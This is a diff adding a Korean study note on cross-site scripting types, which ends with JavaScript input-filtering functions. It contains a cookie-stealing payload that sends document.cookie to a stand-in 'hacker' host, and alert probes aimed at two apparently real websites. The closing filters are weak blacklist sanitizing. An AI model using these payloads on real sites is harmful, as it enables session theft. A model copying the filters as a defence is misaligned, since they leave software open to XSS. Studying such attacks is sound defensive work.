@@ -1,0 +1,51 @@
+xss 공격 종류
+
+<Reflected xss>
+Reflected XSS 공격은 사용자에게 입력 받은 값을 서버에서 되돌려 주는 곳에서 발생합니다. 
+예를 들면 사용자에게 입력 받은 검색어를 그대로 보여주는 곳이나 사용자가 입력한 값을 에러 메세지에 포함하여 보여주는 곳에 악성스크립트가 삽입되면, 서버가 사용자의 입력 값을 포함해 응답해 줄 때 스크립트가 실행됩니다.  
+보통 Reflected XSS 는 공격자가 악의적인 스크립트와 함께 URL을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악의적인 스크립트가 실행되면서 공격을 당하게 됩니다.  
+
+예를 들면, GET 방식으로 검색기능을 구현한 웹 애플리케이션에 XSS 취약점이 있음을 확인한 해커는 공격코드를 작성하였습니다. 
+편의상 URL 인코딩은 하지 않았습니다. http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script>
+
+악의적인 스크립트를 살펴보면 검색 인자로 작성한 스크립트를 넘겨줍니다. 
+해당 스크립트의 내용은 본인의 웹페이지로 URL을 클릭한 사용자의 쿠키 값이 전송되도록 되어 있습니다. 링크를 클릭한 사용자는 해커한테 본인의 의도와는 상관없이 자신의 쿠키 값을 전송하게 됩니다.
+
+<DOM based XSS>
+이런식으로 사용가능 앞에 샾을 사용할 수도있음;;;
+https://www.adotenglish.com/html/body/community/aimhigh_qna?board=<script>alert(document.cookie);</script>
+
+https://dev.read-it.co.kr/html/body/community/bbslist_?db=bd_errata&code=1&k_txt="><a href=x name=xss autofocus onfocus=alert(1)><a/>
+
+<input type="text" autofocus onfocus="alert('1')">
+
+
+인풋에다가 autofocus 옵션을 넣고 onfocus="alert('1')" 이런식으로 태그에 넣으면 자동으로 포커스 되며 스크립트가 실행됨.
+EX) 
+인풋 박스에 강제로 태그를 닫고 ">
+_test1"><script>alert(1)</script>
+
+Persistent(or Stored) XSS
+
+
+
+
+
+function XSSCheck(str, level) {
+    if (level == undefined || level == 0) {
+        str = str.replace(/\<|\>|\"|\'|\%|\;|\(|\)|\&|\+|\-/g,"");
+    } else if (level != undefined && level == 1) {
+        str = str.replace(/\</g, "&lt;");
+        str = str.replace(/\>/g, "&gt;");
+    }
+    return str;
+}
+
+
+$("input[type='text']").each(function(){
+	str = $(this).val();
+        	str = str.replace(/\"|\'|\%|\;|\(|\)|\&|\+|\-/g,"");
+	str = str.replace(/\</g, "&lt;");
+	str = str.replace(/\>/g, "&gt;");
+	return $(this).val(str);
+});
